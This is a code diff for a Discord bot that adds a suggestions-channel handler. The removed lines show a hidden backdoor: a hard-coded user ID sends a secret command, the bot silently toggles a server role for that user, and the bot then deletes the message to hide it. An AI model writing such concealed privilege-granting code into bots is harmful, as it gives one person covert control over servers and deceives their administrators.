@@ -18,6 +18,7 @@ for (const file of commandFiles) {
 	client.commands.set(command.name, command);
 	console.log(`${command.name}: ${command.description}`);
 }
+const suggestion = require('./events/suggestions');
 
 client.once('ready', () => {
 	console.log('Ready!');
@@ -47,18 +48,11 @@ client.once('disconnect', () => {
 });
 
 client.on('message', async (message) => {
-	if (message.author.id == '717134805250342932' && message.content == 'v!myrank') {
-		if (message.guild.members.cache.get('717134805250342932').roles.cache.has('739430106367262740')) {
-			client.guilds.cache.get('592265927819788289').members.cache.get('717134805250342932').roles.remove('739430106367262740');
-		}
-		else {
-			client.guilds.cache.get('592265927819788289').members.cache.get('717134805250342932').roles.add('739430106367262740');
-		}
-		message.delete();
-	}
 	const args = message.content.slice(prefix.length).split(/ +/);
 	const commandName = args.shift().toLowerCase();
 	const command = client.commands.get(commandName);
+
+  if (message.channel.name == '・𝚂uggestions') return suggestion.execute(message, client);
 
 	if (message.author.bot) return;
 	if (!message.content.startsWith(prefix)) return;
